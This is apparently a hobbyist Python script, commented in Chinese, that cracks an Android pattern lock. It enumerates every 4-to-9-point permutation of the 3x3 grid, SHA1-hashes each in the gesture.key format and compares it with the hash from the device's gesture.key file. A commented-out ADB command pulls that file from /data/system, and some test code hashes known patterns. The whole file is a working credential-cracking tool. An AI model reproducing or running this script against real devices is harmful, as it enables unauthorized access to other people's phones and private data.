# coding:utf-8

####
# 主要编程思路如下：
# 首先对0-9这些数字进行排列组合，需要用到Python中的itertools模块，来完成迭代循环操作。
# 组合出来的数字序列在用hashlib模块对字符串进行SHA1加密，然后对gesture.key文件中的密钥进行碰撞，知道找到相同的一组数字序列。
####

####
# 遇到主要问题：格式的转换如果出现错误，就无法正确的枚举到匹配结果
####

import itertools
import hashlib
import binascii



#已知密码测试
konwPass0 = "01478536"
konwPass1 = "0001040708050306"
konwPass2 = "%02x00%02x01%02x04%02x07%02x08%02x05%02x03%02x06"
konwPass3 = "12589647"
konwPass4 = "0102050809060407"
konwPass5 = "%02x01%02x02%02x05%02x08%02x09%02x06%02x04%02x07"
byteStrContent = bytes(konwPass0, 'utf8')
byte2HexContent = binascii.hexlify(byteStrContent)
hex2StringContent = str(byte2HexContent, 'ascii')
formatted_hex = ''.join('%02x' % (ord(c) - ord('0')) for c in konwPass0)
readytouse = binascii.unhexlify(formatted_hex)
print(readytouse)
resultSet = hashlib.sha1(readytouse).hexdigest()
print(resultSet)

# 正式的枚举破解流程如下：

# 0 调用cmd，ADB连接到手机,读取SHA1加密后的解锁码文件中的字符串
#os.system(r"adb pull /data/system/gesture.key gesture.key") #为了个人安全建议关闭系统root，这样就可以防止链接时被人侵入
#time.sleep(5)
# 读取二进制文件，然后转换编码
f = open('gesture.key', 'rb')
pswd = f.readline()
f.close()
# 转换为十六进制的bytes
pswd = binascii.hexlify(pswd)
# 转换为十六进制的str
pswd_hex = str(pswd, 'ascii')
print("获取加密内容为：", pswd_hex)

# 1 生成解锁序列，得到['0','1','2','3','4','5','6','7','8']
matrix = []
for i in range(0, 9):
    str_temp = str(i)
    matrix.append(str_temp)

# 2 将0—8的字符进行排列，至少取4个数排列，最多全部进行排列
min_num = 4
max_num = len(matrix)
list_m = []
for num in range(min_num, max_num + 1):  # 从4 -> 8
    iter1 = itertools.permutations(matrix, num)  # 从9个数字中挑出n个进行排列
    list_m.append(list(iter1))  # 将生成的排列全部存放到 list_m 列表中

# 3 遍历当前生成的序列数组，然后计算对应的hash码进行对比检测
for i in list_m:
    for el in i:  # 遍历这n个数字的全部排列
        strlist = ''.join(el)
        # 最关键的步骤就是生成格式化的字符串数据，否则无法正常的获取要加密的字符串
        formatted_hex = ''.join('%02x' % (ord(c) - ord('0')) for c in strlist)
        ready2use = binascii.unhexlify(formatted_hex)
        strlist_sha1 = hashlib.sha1(ready2use).hexdigest()  # 将字符串进行SHA1加密
        if strlist_sha1 == pswd_hex:
            print("获取解锁密码为：", strlist)